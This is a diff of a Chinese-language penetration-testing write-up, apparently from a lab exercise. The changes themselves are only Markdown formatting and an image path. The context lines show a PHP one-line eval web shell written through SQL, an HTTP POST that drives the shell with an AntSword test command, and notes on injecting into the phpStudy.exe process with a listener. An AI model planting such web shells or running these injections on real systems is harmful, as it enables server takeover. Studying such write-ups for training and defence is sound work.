@@ -485,13 +485,14 @@ SELECT '<?php @eval($_POST["888"]);?>'
 >POST /shell.php HTTP/1.1
 >Host: 目标IP
 >Content-Type: application/x-www-form-urlencoded
->
+>```
+>```php
 >888=echo "antsword_connected";
 >```
 >
 >服务器执行：
 >
->```http
+>```php
 >echo "antsword_connected";
 >```
 >
@@ -623,7 +624,7 @@ inject 2964
 
 选择 hongri 监听器，发现不允许
 
-![inject-explorer-fail](./images/)
+![inject-explorer-fail](./images/inject-explorer-fail.png)
 
 那我们就选择注入到 phpStudy.exe 进程中，同样选择 hongri 监听器
 
